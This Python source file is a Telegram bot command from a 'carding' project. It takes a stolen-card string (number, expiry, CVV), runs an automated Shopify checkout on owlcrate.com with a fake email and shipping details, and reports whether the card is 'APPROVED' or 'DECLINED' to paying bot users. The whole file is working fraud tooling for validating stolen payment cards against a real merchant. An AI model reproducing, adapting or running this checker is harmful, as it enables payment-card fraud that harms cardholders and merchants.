import requests
import time
import random
import json
import string
import re
import urllib
from datetime import datetime
from random import choice

from pyrogram import Client
from pyrogram.types import Message

from carding.functions import *
from carding.database.checkuser_sql import already_added

def random_char(char_num):
  return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

def email_gen():
  return f'{random_char(16)}765238@gmail.com'

email = urllib.parse.quote_plus(email_gen())

@Client.on_message(cmd('ad'))
async def ad_func(client, message: Message):
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if user_id != 5032070399:
       return await message.reply("**GATE MAINTENANCE!**")
  
    file = open('carding/temp/Premium.txt', 'r').readlines()
    if str(message.chat.id) + "\n" in file or str(user_id) + "\n" in file or user_id == 5032070399:
       pass
    else:
       await message.reply_text("**SORRY!**\nThis cmd only for paid users..")
       return
    if is_spam(user_id):
        return await message.reply_text("**ANTISPAM!**\nWait in 5s and try again..")

    try:
        if already_added(user_id):
            pass
        elif not already_added(user_id):
            await message.reply_text("Please **register** 1st..\nSend /register for registration")
            return
        query = ''
        for i in message.command[1:]:
            query += ' ' + str(i)
        if not query:
            await message.reply_text("**Input valid Card!**\nEx: `/ad cc|mm|yy|cvv`")
            return
        
        start_time = time.time()
        text = "**Checking Your Card...⏳**"
        msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
        splitter = re.findall(r"[0-9]+", query)
        cc = splitter[0]
        month = splitter[1]
        year = splitter[2]
        cvc = splitter[3]
        cc1 = cc[:4]
        cc2 = cc[4:-8]
        cc3 = cc[8:-4]
        cc4 = cc[-4:]
        strlenx = len(cc)
        cvvd = cvc[:3]
        cvvx = cvc[:4]
        bin = cc[:6]
        file = open('carding/temp/bin.txt', 'r').readlines() 
        if str(bin) + "\n" in file:
           await msg.edit_text("**BIN BANNED!**"
                                )
           return
        if month.startswith('0'):
            month = month[-1:]
        if (strlenx < 16):
            cvv = cvvx
        else:
            cvv = cvvd

        lista = cc + "|" + month + "|" + year + "|" + cvv

        
        s = requests.Session()
               

        res = requests.get("https://dragon-bin-api.vercel.app/api/" + bin)
        bin_data = json.loads(res.text)
        vendor = bin_data["data"]["vendor"]
        bank = bin_data["data"]["bank"]
        type = bin_data["data"]["type"]
        country = bin_data["data"]["country"]
        level = bin_data["data"]["level"]
        flag = bin_data["data"]["countryInfo"]["emoji"]
        # -----------[ If Not Respond ]----------------
        vendor = "Unavailable" if not vendor else vendor
        bank = "Unavailable" if not bank else bank
        type = "Unavailable" if not type else type
        level = "Unavailable" if not level else level

        url = 'https://www.owlcrate.com/cart/add.js'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'en-US,en;q=0.5',
  'Content-Type': 'application/json;charset=utf-8',
  'Origin': 'https://www.owlcrate.com',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Referer': 'https://www.owlcrate.com/products/zodiac-adventure-button-pin?variant=39728207855791',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}
        data = '{"quantity":1,"id":39728207855791,"properties":{"cart_limit":null}}'

        resp = s.post(url=url, headers=headers, data=data)
        result = resp.text

# Request 2
        url = 'https://www.owlcrate.com/cart'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://www.owlcrate.com',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Referer': 'https://www.owlcrate.com/cart',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'TE': 'trailers'
}
        data = 'updates%5B%5D=1&checkout=Checkout'
        resp = s.post(url=url, headers=headers, data=data)
        result = resp.text
        location = resp.url
        id1 = getStr(location, '.com/', '/')
        id2 = getStr(location+'|', 'checkouts/', '|')
        auth1 = getStr(result, '<input type="hidden" name="authenticity_token" value="', '" autocomplete="off" />')

# Request 3
        url = f'https://www.owlcrate.com/{id1}/checkouts/{id2}'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Referer': 'https://www.owlcrate.com/',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://www.owlcrate.com',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'TE': 'trailers'
}
        data = f'_method=patch&authenticity_token={auth1}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={email}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Decoder&checkout%5Bshipping_address%5D%5Blast_name%5D=xD&checkout%5Bshipping_address%5D%5Baddress1%5D=9436+deer+lodge&checkout%5Bshipping_address%5D%5Baddress2%5D=23&checkout%5Bshipping_address%5D%5Bcity%5D=las+vegas&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=NV&checkout%5Bshipping_address%5D%5Bzip%5D=89129&checkout%5Bshipping_address%5D%5Bphone%5D=%28856%29+785-7683&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1025&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
        resp = s.post(url=url, headers=headers, data=data)
        result = resp.text
        auth2 = getStr(result, '<input type="hidden" name="authenticity_token" value="', '" autocomplete="off" />')
        shipping_rate = urllib.parse.quote_plus(getStr(result, '<div class="radio-wrapper" data-shipping-method="', '">'))
        total = getStr(result, 'data-checkout-payment-due="', '"')

# Request 4
        url = f'https://www.owlcrate.com/{id1}/checkouts/{id2}'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Referer': 'https://www.owlcrate.com/',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://www.owlcrate.com',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'TE': 'trailers'
}
        data = f'_method=patch&authenticity_token={auth2}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D={shipping_rate}&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
        resp = s.post(url=url, headers=headers, data=data)

# Request 5
        url = f'https://www.owlcrate.com/{id1}/checkouts/{id2}?step=payment_method'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': '*/*',
  'Accept-Language': 'en-US,en;q=0.5',
  'Referer': 'https://www.owlcrate.com/',
  'X-Requested-With': 'XMLHttpRequest',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}

        resp = s.get(url=url, headers=headers)
        result = resp.text
        auth3 = getStr(result, '<input type="hidden" name="authenticity_token" value="', '" autocomplete="off" />')
        gateway = getStr(result, 'data-select-gateway="', '"')

# Request 6
        url = 'https://deposit.us.shopifycs.com/sessions'
        headers = {
  'Host': 'deposit.us.shopifycs.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'application/json',
  'Accept-Language': 'en-US,en;q=0.5',
  'Referer': 'https://checkout.shopifycs.com/',
  'Content-Type': 'application/json',
  'Origin': 'https://checkout.shopifycs.com',
  'Connection': 'keep-alive',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-site'
}
        data = '{"credit_card":{"number":"'+cc1+' '+cc2+' '+cc3+' '+cc4+'","name":"Decoder xD","month":'+month+',"year":'+year+',"verification_value":"'+cvv+'"},"payment_session_scope":"www.owlcrate.com"}'
        resp = s.post(url=url, headers=headers, data=data)
        result = resp.json()
        id = result['id']

# Request 7
        url = f'https://www.owlcrate.com/{id1}/checkouts/{id2}'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Referer': 'https://www.owlcrate.com/',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://www.owlcrate.com',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-User': '?1',
  'TE': 'trailers'
}
        data = f'_method=patch&authenticity_token={auth3}&previous_step=payment_method&step=&s={id}&checkout%5Bpayment_gateway%5D={gateway}&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=624&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1042&checkout%5Bclient_details%5D%5Bbrowser_height%5D=739&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330'
        resp = s.post(url=url, headers=headers, data=data)
        time.sleep(4)

# Request 8
        url = f'https://www.owlcrate.com/{id1}/checkouts/{id2}/processing?from_processing_page=1'
        headers = {
  'Host': 'www.owlcrate.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Alt-Used': 'www.owlcrate.com',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}

        resp = s.get(url=url, headers=headers)
        result = resp.text
        message = getStr(result, '<div class="notice__content"><p class="notice__text">', '</p></div>')
        stop_time = time.time() - start_time
        date = datetime.today().strftime('%d-%m-%Y')
        if 'Thank you' in result or 'Your order is confirmed' in result or '2001 Insufficient Funds' in result:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = '1000: Approved'
        elif '2010 Card Issuer Declined CVV' in resp.text:
           status = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
           reson = "CVV2/CVC2 Failure"
        else:
           status = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ⭕"
           reson = message

        lastxrespon = f"""
<b>𝐆𝐀𝐓𝐄 𝐀𝐃𝐘𝐄𝐍 + 𝐁𝟑 𝐀𝐔𝐓𝐇</b>
•━━━━━━━━━━━━━━━━━━━•
<code>{lista}</code>
╾──────────────────╼
<b>•𝗦𝘁𝗮𝘁𝘀:</b> {status}
<b>•𝗠𝘀𝗴:</b> {reson}
<b>•𝗕𝗮𝗻𝗸 𝗡𝗮𝗺𝗲:</b> {bank}
<b>•𝗖𝗮𝗿𝗱 𝗕𝗿𝗮𝗻𝗱:</b> {vendor}
<b>•𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:</b> {type} • {level}
<b>•𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {country} {flag}
<b>•𝗧𝗼𝗼𝗸:</b> <code>{stop_time:.02f}s</code> [ {date} ]
•━━━━━━━━━━━━━━━━━━━•
<b>•𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> <a href="tg://user?id={user_id}">{name}</a> [ {ustat(user_id)} ]
"""

        await msg.edit_text(lastxrespon, parse_mode="HTML")
        curl.close()

    except Exception as e:      
        print(e)
